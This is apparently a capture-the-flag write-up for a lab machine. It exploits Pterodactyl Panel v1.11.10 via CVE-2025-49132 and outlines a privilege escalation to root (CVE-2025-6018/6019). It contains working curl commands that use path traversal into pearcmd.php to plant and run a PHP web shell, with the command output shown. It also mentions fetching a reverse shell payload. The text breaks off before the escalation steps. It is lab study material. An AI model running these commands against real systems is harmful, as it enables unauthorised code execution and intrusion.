Foothold — Unauthenticated RCE

Pterodactyl Panel v1.11.10 is affected by CVE-2025-49132 — an unauthenticated Remote Code Execution rated CVSS 10.0.
Source: github.com/GRodolphe/CVE-2025-49132_poc

The catch: none of the public PoCs work out of the box, because they reference the wrong path for pearcmd.php.

A leftover phpinfo.php file at http://pterodactyl.htb/phpinfo.php reveals the correct path:

Correct path: usr/share/php/PEAR/pearcmd.php

Manually triggering RCE via curl (with a bit of AI-assisted debugging):

manual pearcmd RCE trigger 
curl "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('id')?>+/tmp/p.php"

curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=p" | grep 'uid'
uid=474(wwwrun) gid=477(www) groups=477(www)

Automating full RCE (filling blank spaces with ${IFS}) failed for unclear reasons — curl and Burp Suite behaved differently against the same request. Went manual instead: curl the revshell payload down from a web server and execute it.

LPE chain is CVE-2025-6018 (PAM/session misconfig, local unpriv → higher unpriv) followed by CVE-2025-6019 (libblockdev/udisks LPE, → root).

Mount the crafted image via udisksctl and trigger the vulnerable resize path:
